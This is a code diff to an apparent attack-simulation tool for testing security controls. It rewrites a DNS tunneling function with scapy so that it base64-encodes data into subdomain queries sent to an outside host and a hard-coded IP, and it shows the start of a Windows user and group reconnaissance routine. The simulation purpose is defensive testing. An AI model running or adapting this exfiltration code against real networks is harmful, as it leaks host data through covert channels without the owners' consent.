@@ -14,6 +14,9 @@ from math import floor
 from datetime import datetime, timedelta
 from cryptography.fernet import Fernet
 import glob 
+from scapy.all import DNS, DNSQR, IP, sr1, UDP
+
+
 #Configurable Variables
 API_KEY = "PLACEHOLDER_API_KEY"  
 USE_CASES = PLACEHOLDER_USE_CASES
@@ -378,34 +381,45 @@ def ransomware_simulation():
 
 def dns_tunneling():
     logging_func("DNS tunneling simulation starting")
-    DNS_TUNNEL_API = f"{base_url}/api/dnstunneling"
-    try:
-        print("Executing DNS Tunneling Use-Case")
-        # Example data to send
-        data_to_send = f"{socket.gethostname()}-test-data"     
-        # Encode data to Base64 (URL-safe)
-        encoded_data = base64.urlsafe_b64encode(data_to_send.encode('utf-8')).decode('utf-8')
-        print(f"Encoded Data (Base64): {encoded_data}")
-        # Simulate a DNS query by sending the encoded data as a subdomain
-        headers = {
-            "Host": f"{encoded_data}.bitlus.online",  # Format as subdomain
-        }
-        # Send the request to the API
-        response = requests.get(DNS_TUNNEL_API, headers=headers)
-        # Handle the API response
-        if response.status_code == 200:
-            response_data = response.json()
-            print(f"DNS Tunneling successful: {response_data['decoded_data']}")
-            logging_func("DNS Tunneling successful")
-            return {"use_case": "dns_tunneling", "status": f"completed: {response_data['decoded_data']}"}
-        else:
-            print(f"DNS Tunneling failed: {response.json().get('message')}")
-            logging_func("DNS Tunneling failed")
-            return {"use_case": "dns_tunneling", "status": "failed", "error": response.json().get('message')}
-    except Exception as e:
-        print(f"Error in DNS Tunneling: {e}")
-        logging_func("DNS Tunneling Error")
-        return {"use_case": "dns_tunneling", "status": f"error{e}"}
+    text = "testSuperSecretCode"
+    text_bytes = base64.urlsafe_b64encode(text.encode("ascii"))
+    text_str = text_bytes.decode("ascii")   
+    qname = f"{text_str}.dns.bitlus.online"
+    dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
+    answer = sr1(dns_req, verbose=1, timeout=5)
+    if answer:
+        answer.show()  # This prints the entire DNS response
+    else:
+        print("No response received.")
+
+    # DNS_TUNNEL_API = f"{base_url}/api/dnstunneling"
+    # try:
+    #     print("Executing DNS Tunneling Use-Case")
+    #     # Example data to send
+    #     data_to_send = f"{socket.gethostname()}-test-data"     
+    #     # Encode data to Base64 (URL-safe)
+    #     encoded_data = base64.urlsafe_b64encode(data_to_send.encode('utf-8')).decode('utf-8')
+    #     print(f"Encoded Data (Base64): {encoded_data}")
+    #     # Simulate a DNS query by sending the encoded data as a subdomain
+    #     headers = {
+    #         "Host": f"{encoded_data}.bitlus.online",  # Format as subdomain
+    #     }
+    #     # Send the request to the API
+    #     response = requests.get(DNS_TUNNEL_API, headers=headers)
+    #     # Handle the API response
+    #     if response.status_code == 200:
+    #         response_data = response.json()
+    #         print(f"DNS Tunneling successful: {response_data['decoded_data']}")
+    #         logging_func("DNS Tunneling successful")
+    #         return {"use_case": "dns_tunneling", "status": f"completed: {response_data['decoded_data']}"}
+    #     else:
+    #         print(f"DNS Tunneling failed: {response.json().get('message')}")
+    #         logging_func("DNS Tunneling failed")
+    #         return {"use_case": "dns_tunneling", "status": "failed", "error": response.json().get('message')}
+    # except Exception as e:
+    #     print(f"Error in DNS Tunneling: {e}")
+    #     logging_func("DNS Tunneling Error")
+    #     return {"use_case": "dns_tunneling", "status": f"error{e}"}
  
 def net_recon():
     CMD = ['group', 'user', 'localgroup', 'user /domain']
